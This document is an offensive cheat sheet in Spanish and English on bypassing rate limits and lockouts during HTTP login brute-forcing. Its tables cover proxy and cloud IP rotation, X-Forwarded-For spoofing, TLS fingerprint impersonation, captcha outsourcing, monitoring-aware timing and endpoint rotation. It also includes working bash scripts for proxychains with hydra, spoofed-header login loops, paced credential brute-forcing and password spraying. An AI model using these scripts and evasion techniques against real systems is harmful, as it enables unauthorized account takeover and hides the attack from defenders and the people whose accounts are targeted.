---
aliases:
  - Rate Limit Bypass
  - IP Rotation
  - X-Forwarded-For Spoof
  - Lockout Evasion
tags:
  - type/cheatsheet
  - vuln/brute-force
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[HTTP Brute Forcing]]"
---
# HTTP Brute Forcing - Bypass de Rate-Limit

***

## IP Rotation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Tor SOCKS5 | `proxychains -q hydra ...` | Free, slow, exit nodes blocked sometimes. |
| Free proxy lists | `gimmeproxy.com`, `proxyscrape.com` | Unreliable, slow. |
| Paid residential proxies | BrightData, Smartproxy, Oxylabs | $$ — high success. |
| Datacenter proxies | Cheap, easily detected | $ — low success vs WAF. |
| Cloud VPS rotation | Spin VPS in 50+ regions | Custom infra. |
| AWS Lambda invokes | Each Lambda = different IP | Free tier, fast. |
| Cloudflare Workers | Each request = CF edge IP | Free tier abuse. |
| ProxyChains | Tunnel via multiple proxies | Layered. |
| OpenVPN per-request | Re-connect VPN each N | Slow. |
| Wireguard rotation | Same as VPN | Faster. |
| Mullvad/PIA per-request | Premium VPN rotation | Expensive but reliable. |
| `requesocks` Python | SOCKS-aware requests | Custom scripts. |
| `httpx` + proxy list | `httpx -proxy http://1.2.3.4:8080` | Bulk. |
| Rotate per N requests | 1 IP per 5 attempts | Pacing. |
| Random subset per attempt | `shuf -n 1 proxies.txt` | Per-call random. |
| GeoIP-aware rotation | Match user's country expected | Avoid suspicious geo. |
^bf-bypass-iprotation

### ProxyChains setup

```bash
# /etc/proxychains.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 9050    # Tor
http   1.2.3.4 8080
http   5.6.7.8 8080

# Run hydra via proxychains
proxychains -q hydra -L users.txt -P pass.txt target.com http-post-form ...

# Tor only (faster setup)
sudo systemctl start tor
proxychains -q hydra ...
```

___

## Header Spoofing (X-Forwarded-For etc)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `X-Forwarded-For: 1.2.3.4` | App lee XFF en lugar de socket IP | Most common. |
| `X-Real-IP: 1.2.3.4` | Variant Nginx | Same. |
| `X-Originating-IP` | Email-style | Edge. |
| `X-Remote-IP` | Variant | Edge. |
| `X-Remote-Addr` | Variant | Edge. |
| `X-Client-IP` | Variant | Edge. |
| `Forwarded: for=1.2.3.4` | RFC 7239 | Modern. |
| `True-Client-IP` | Akamai | CDN-specific. |
| `CF-Connecting-IP` | Cloudflare | CF behind WAF. |
| `Fastly-Client-IP` | Fastly CDN | Specific. |
| `X-Forwarded-Host` | Host spoof combo | HHI combo. |
| `X-Cluster-Client-IP` | Cluster | Internal. |
| `X-Custom-IP-Authorization` | Custom app header | Per-app discovery. |
| Multiple XFF chain | `X-Forwarded-For: 1.2.3.4, 5.6.7.8` | App takes first vs last. |
| Random per-request | New IP each request | Bypass per-IP counter. |
| Spoof internal IPs | `127.0.0.1`, `10.0.0.1` | Sometimes whitelisted. |
^bf-bypass-headerspoof

### Burp Intruder XFF rotation

```
# Intruder → Payloads → Add header
# Use payload type "Numbers" 1-10000 mapped to X-Forwarded-For

# Or curl loop
for i in {1..255}; do
  for j in {1..255}; do
    curl -s -X POST https://target/login \
      -H "X-Forwarded-For: 1.$i.$j.$RANDOM" \
      -d "user=admin&pass=$PASS"
  done
done
```

___

## User-Agent + Session Rotation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| User-Agent rotation | Random UA per request | Per-UA fingerprint detection. |
| `Accept-Language` randomization | Diff locale per request | Locale-based fingerprint. |
| Cookie clearing per attempt | New session each attempt | Session-bound counter. |
| Pre-fetch session | Get fresh `Set-Cookie` then attempt | Stateful counter. |
| New CSRF token per attempt | Fetch /login → token → submit | Token-bound. |
| Browser fingerprint diversification | Headless browsers diff config | Anti-bot bypass. |
| Canvas fingerprint randomization | If canvas required | Advanced. |
| WebGL fingerprint | Same | Advanced. |
| TLS fingerprint (JA3) | curl-impersonate | Anti-bot bypass. |
| HTTP/2 settings | Match real browsers | Modern apps. |
| Header order matters | Match Chrome ordering | curl-impersonate. |
| Referer header rotation | `Referer: https://google.com/...` | Mimic referer. |
| `Sec-CH-*` Client Hints | Modern browsers send | Anti-bot. |
| Cookie `cf_clearance` | Cloudflare challenge solve | One-time. |
| Captcha API outsource | 2captcha, anticaptcha | Auto-solve. |
| Mobile UA emulation | Mobile less rate-limited | Sometimes. |
^bf-bypass-uasession

### curl-impersonate (TLS/JA3 evasion)

```bash
# Install curl-impersonate
docker pull lwthiker/curl-impersonate:0.5-chrome

# Make request impersonating Chrome
docker run --rm lwthiker/curl-impersonate:0.5-chrome \
  curl_chrome116 https://target/login -d "user=admin&pass=$PASS"
```

___

## Timing Distribution

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Random delay 1-5s | `sleep $((RANDOM % 5))` between attempts | Avoid burst detection. |
| Sleep N min between bursts | 10 attempts then sleep 10 min | Reset counters. |
| Time-of-day pacing | Spread over 24h | Hide in legit traffic. |
| Spread across week | 10/day per week | Slow brute, low signal. |
| Office hours only | 9-17 weekdays | Match legit pattern. |
| Random jitter | ±20% on delays | Avoid pattern detection. |
| Ramp-up | Slow start, increase pace | Avoid initial flag. |
| Backoff on 429 | Exponential backoff | Smart pacing. |
| Reset detection | Test recovery time | Find lockout window. |
| Burst window race | Submit N within 100ms | Race-based. |
| Async parallel | Multiple users in parallel | Per-user counter only. |
| Spread across endpoints | `/login`, `/api/login`, `/v2/login` | Per-endpoint counter. |
| Per-user rotation | 1 attempt per user, cycle | Reverse spray. |
| Calendar-aware | Avoid known monitoring windows | Insider knowledge. |
| Holiday timing | Easter, Christmas — less monitoring | Edge. |
| Just below threshold | If 10/min limit, do 9/min | Stay under. |
^bf-bypass-timing

### Smart pacing script

```bash
#!/bin/bash
# Submit 1 attempt, sleep random 30-90s
PASSWORDS=$(cat passwords.txt)
USERS=$(cat users.txt)

for user in $USERS; do
  for pass in $PASSWORDS; do
    curl -s -X POST https://target/login \
      -d "username=$user&password=$pass" \
      -o /dev/null -w "%{http_code} $user:$pass\n"
    sleep $((RANDOM % 60 + 30))
  done
done
```

___

## Endpoint / Account Rotation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Multiple login endpoints | `/login`, `/api/login`, `/oauth/token` | Per-endpoint counter. |
| Mobile vs web endpoints | Different paths same backend | Counter per path. |
| Legacy/deprecated endpoints | `/v1/login` no rate limit | Defender forgot. |
| Admin vs user endpoints | `/admin/login` separate | Per-area. |
| Reset password endpoint reuse | Send reset → uses different counter | Adjacent. |
| OAuth grant_type=password | RFC 6749 password grant | Often less limited. |
| Internal API discovery | `/internal/auth` exposed | Misconfig. |
| Reverse brute (1 pass, many users) | Single attempt per user | No per-user lock. |
| Spray cycling | Pass1 across users, then Pass2 | Slow but stealthy. |
| Cluster node bypass | Different node = no shared counter | Distributed flaw. |
| Subdomain auth | `auth.target.com` separate stack | Same backend often. |
| Per-tenant endpoints (SaaS) | `customer1.target.com/login` | Multitenancy. |
| WebSocket auth | `wss://target/auth` | Sometimes uncounted. |
| GraphQL auth mutation | `mutation { login(...) }` | Different path. |
| RESTful login resource | `POST /sessions` | Alternative. |
| RPC-style login | `/rpc?method=login` | Edge. |
^bf-bypass-endpoints

### Reverse spray (anti-lockout)

```bash
# 1 password against many users — no per-user lockout triggered
USERS=$(cat 1000_users.txt)

for pass in "Password2025!" "Welcome1!" "Spring2025"; do
  for user in $USERS; do
    curl -s -X POST https://target/login \
      -d "username=$user&password=$pass" \
      -o /dev/null -w "%{http_code} $user $pass\n"
    sleep 1  # 1/sec to avoid IP-level
  done
  sleep 3600  # 1h between password rounds
done
```

***
